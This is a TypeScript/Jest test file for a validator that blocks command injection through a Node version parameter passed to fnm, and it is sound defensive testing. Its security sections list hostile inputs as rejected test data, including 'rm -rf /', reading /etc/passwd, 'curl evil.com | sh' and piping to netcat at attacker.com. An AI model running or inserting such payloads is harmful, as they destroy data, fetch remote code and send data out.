/**
 * Security Validation Tests - Node Version Parameter Validation
 *
 * Tests for validateNodeVersion() function to prevent command injection
 * in CommandExecutor when using nodeVersion parameter with fnm.
 *
 * SECURITY CONTEXT:
 * - Severity: HIGH (CWE-77: Command Injection)
 * - Attack Vector: Unvalidated nodeVersion interpolated into shell command
 * - Vulnerable Pattern: `fnm exec --using=${nodeVersion} ${command}`
 *
 * Target Coverage: 100% (security-critical code)
 */

import { validateNodeVersion } from '@/core/validation';

describe('securityValidation - validateNodeVersion', () => {

    // =================================================================
    // HAPPY PATH TESTS - Valid Node Version Formats
    // =================================================================

    describe('valid numeric major versions', () => {
        it('should accept numeric major versions', () => {
            expect(() => validateNodeVersion('18')).not.toThrow();
            expect(() => validateNodeVersion('20')).not.toThrow();
            expect(() => validateNodeVersion('22')).not.toThrow();
            expect(() => validateNodeVersion('24')).not.toThrow();
        });

        it('should accept single-digit versions', () => {
            expect(() => validateNodeVersion('8')).not.toThrow();
            expect(() => validateNodeVersion('6')).not.toThrow();
        });

        it('should accept three-digit versions', () => {
            expect(() => validateNodeVersion('100')).not.toThrow();
        });
    });

    describe('valid semantic versions', () => {
        it('should accept semantic versions (major.minor.patch)', () => {
            expect(() => validateNodeVersion('18.20.0')).not.toThrow();
            expect(() => validateNodeVersion('20.11.0')).not.toThrow();
            expect(() => validateNodeVersion('24.0.0')).not.toThrow();
        });

        it('should accept versions with double-digit components', () => {
            expect(() => validateNodeVersion('18.20.10')).not.toThrow();
            expect(() => validateNodeVersion('20.15.99')).not.toThrow();
        });

        it('should accept versions with triple-digit components', () => {
            expect(() => validateNodeVersion('100.200.300')).not.toThrow();
        });

        it('should accept zero in any position', () => {
            expect(() => validateNodeVersion('0.10.0')).not.toThrow();
            expect(() => validateNodeVersion('18.0.0')).not.toThrow();
            expect(() => validateNodeVersion('20.11.0')).not.toThrow();
        });
    });

    describe('valid special keywords', () => {
        it('should accept "auto" keyword', () => {
            expect(() => validateNodeVersion('auto')).not.toThrow();
        });

        it('should accept "current" keyword', () => {
            expect(() => validateNodeVersion('current')).not.toThrow();
        });
    });

    describe('null and undefined handling', () => {
        it('should accept null (skip validation)', () => {
            expect(() => validateNodeVersion(null)).not.toThrow();
        });

        it('should accept undefined (skip validation)', () => {
            expect(() => validateNodeVersion(undefined)).not.toThrow();
        });
    });

    // =================================================================
    // EDGE CASE TESTS - Invalid Formats
    // =================================================================

    describe('empty and whitespace strings', () => {
        it('should reject empty string', () => {
            expect(() => validateNodeVersion(''))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject whitespace-only strings', () => {
            expect(() => validateNodeVersion('   '))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('\t'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('\n'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject versions with leading/trailing whitespace', () => {
            expect(() => validateNodeVersion('  20  '))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion(' 18.20.0 '))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject versions with internal whitespace', () => {
            expect(() => validateNodeVersion('20 . 11 . 0'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('20 11 0'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('invalid semantic version formats', () => {
        it('should reject incomplete semantic versions', () => {
            expect(() => validateNodeVersion('20.11'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('18.20'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject quad versions', () => {
            expect(() => validateNodeVersion('20.0.0.0'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject versions with prefixes', () => {
            expect(() => validateNodeVersion('v20'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('v18.20.0'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('node-20'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject versions with suffixes', () => {
            expect(() => validateNodeVersion('20-lts'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('18.20.0-beta'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('case sensitivity enforcement', () => {
        it('should reject uppercase "AUTO"', () => {
            expect(() => validateNodeVersion('AUTO'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject mixed case "Auto"', () => {
            expect(() => validateNodeVersion('Auto'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject uppercase "CURRENT"', () => {
            expect(() => validateNodeVersion('CURRENT'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject mixed case "Current"', () => {
            expect(() => validateNodeVersion('Current'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('alternative keywords rejection', () => {
        it('should reject "lts" keyword', () => {
            expect(() => validateNodeVersion('lts'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject "latest" keyword', () => {
            expect(() => validateNodeVersion('latest'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject "stable" keyword', () => {
            expect(() => validateNodeVersion('stable'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject other common version aliases', () => {
            expect(() => validateNodeVersion('lts-latest'))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion('node'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    // =================================================================
    // SECURITY TESTS - Command Injection Prevention (CRITICAL)
    // =================================================================

    describe('CRITICAL: command injection attacks - semicolon', () => {
        it('should block semicolon injection - rm command', () => {
            expect(() => validateNodeVersion('20; rm -rf /'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block semicolon injection - multiple commands', () => {
            expect(() => validateNodeVersion('20; echo "pwned"; whoami'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block semicolon at end', () => {
            expect(() => validateNodeVersion('20;'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - ampersand', () => {
        it('should block double ampersand (AND operator)', () => {
            expect(() => validateNodeVersion('20 && cat /etc/passwd'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block single ampersand (background execution)', () => {
            expect(() => validateNodeVersion('20 & curl evil.com'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block ampersand with malicious payload', () => {
            expect(() => validateNodeVersion('20&&whoami'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - pipe', () => {
        it('should block pipe to netcat', () => {
            expect(() => validateNodeVersion('20 | nc attacker.com 1234'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block pipe to grep', () => {
            expect(() => validateNodeVersion('20 | grep secret'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block pipe without spaces', () => {
            expect(() => validateNodeVersion('20|cat'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - backtick substitution', () => {
        it('should block backtick command substitution - whoami', () => {
            expect(() => validateNodeVersion('20`whoami`'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block backtick command substitution - id', () => {
            expect(() => validateNodeVersion('`id`'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block nested backticks', () => {
            expect(() => validateNodeVersion('20`echo \`whoami\``'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - dollar sign substitution', () => {
        it('should block $(command) substitution - id', () => {
            expect(() => validateNodeVersion('20$(id)'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block $(command) substitution - curl', () => {
            expect(() => validateNodeVersion('20;$(curl evil.com)'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block ${variable} expansion', () => {
            expect(() => validateNodeVersion('${PATH}'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block $() without semicolon', () => {
            expect(() => validateNodeVersion('$(whoami)'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - quote injection', () => {
        it('should block single quote injection - SQL-style', () => {
            expect(() => validateNodeVersion("20' OR '1'='1"))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block double quote injection', () => {
            expect(() => validateNodeVersion('20" && echo "pwned'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block quote escaping attempts', () => {
            expect(() => validateNodeVersion('20\' && echo \'pwned'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - newline injection', () => {
        it('should block newline with malicious command', () => {
            expect(() => validateNodeVersion('20\nrm -rf /'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block carriage return', () => {
            expect(() => validateNodeVersion('20\rcat /etc/passwd'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block CRLF', () => {
            expect(() => validateNodeVersion('20\r\nwhoami'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: command injection attacks - redirection', () => {
        it('should block output redirection - overwrite', () => {
            expect(() => validateNodeVersion('20 > /tmp/evil'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block output redirection - append', () => {
            expect(() => validateNodeVersion('20 >> /tmp/evil'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block input redirection', () => {
            expect(() => validateNodeVersion('20 < /etc/passwd'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block here document', () => {
            expect(() => validateNodeVersion('20 << EOF'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    describe('CRITICAL: combined injection attacks', () => {
        it('should block complex multi-stage attack', () => {
            expect(() => validateNodeVersion('20; curl evil.com | sh'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block encoded attack attempts', () => {
            expect(() => validateNodeVersion('20 && $(echo d2hvYW1p | base64 -d)'))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should block environment variable manipulation', () => {
            expect(() => validateNodeVersion('20 && export PATH=/tmp:$PATH'))
                .toThrow(/invalid Node.js version format/i);
        });
    });

    // =================================================================
    // ERROR MESSAGE QUALITY TESTS
    // =================================================================

    describe('error message guidance', () => {
        it('should provide helpful error message for invalid format', () => {
            expect(() => validateNodeVersion('v20'))
                .toThrow(/invalid Node.js version format.*valid formats.*18.*18\.20\.0.*auto.*current/i);
        });

        it('should provide helpful error message for injection attempt', () => {
            expect(() => validateNodeVersion('20; rm -rf /'))
                .toThrow(/invalid Node.js version format.*valid formats.*18.*18\.20\.0.*auto.*current/i);
        });

        it('should provide helpful error message for empty string', () => {
            expect(() => validateNodeVersion(''))
                .toThrow(/invalid Node.js version format.*valid formats.*18.*18\.20\.0.*auto.*current/i);
        });
    });

    // =================================================================
    // TYPE SAFETY TESTS
    // =================================================================

    describe('type safety', () => {
        it('should reject non-string values', () => {
            expect(() => validateNodeVersion(123 as any))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion({} as any))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion([] as any))
                .toThrow(/invalid Node.js version format/i);
        });

        it('should reject boolean values', () => {
            expect(() => validateNodeVersion(true as any))
                .toThrow(/invalid Node.js version format/i);
            expect(() => validateNodeVersion(false as any))
                .toThrow(/invalid Node.js version format/i);
        });
    });
});
